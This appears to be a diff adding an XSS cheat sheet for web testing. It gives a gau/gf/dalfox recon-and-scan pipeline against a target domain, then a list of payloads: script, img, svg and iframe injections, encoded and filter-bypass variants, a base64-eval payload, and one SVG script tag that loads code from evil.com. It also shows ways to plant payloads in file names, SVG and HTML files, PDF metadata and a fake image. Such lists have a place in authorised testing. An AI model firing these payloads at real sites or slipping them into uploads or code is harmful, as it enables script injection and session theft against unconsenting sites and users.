@@ -1,0 +1,44 @@
+gau target.com | grep '=' | gf xss > xss-params.txt
+dalfox file xss-params.txt -o xss_results.txt
+
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+"><iframe src=javascript:alert(1)>
+
+<script%0a>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<svg><script xlink:href=//evil.com></script>
+<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">
+
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+"><img src=x onerror=eval(atob('YWxlcnQoMSk='))>
+
+mv file.png '"><script>alert(1)</script>.png'
+
+<!-- xss.svg -->
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>alert(1)</script>
+</svg>
+
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 124 124" fill="none">
+<rect width="124" height="124" rx="24" fill="#000000"/>
+   <script type="text/javascript">  
+      alert(0x539);
+   </script>
+</svg>
+
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>alert(1)</script>
+</svg>
+
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+
+<!-- payload.html -->
+<html><body><script>alert(1)</script></body></html>
+
+exiftool -Title='<script>alert(1)</script>' document.pdf
+
+echo "<script>alert(1)</script>" > test.jpg
+
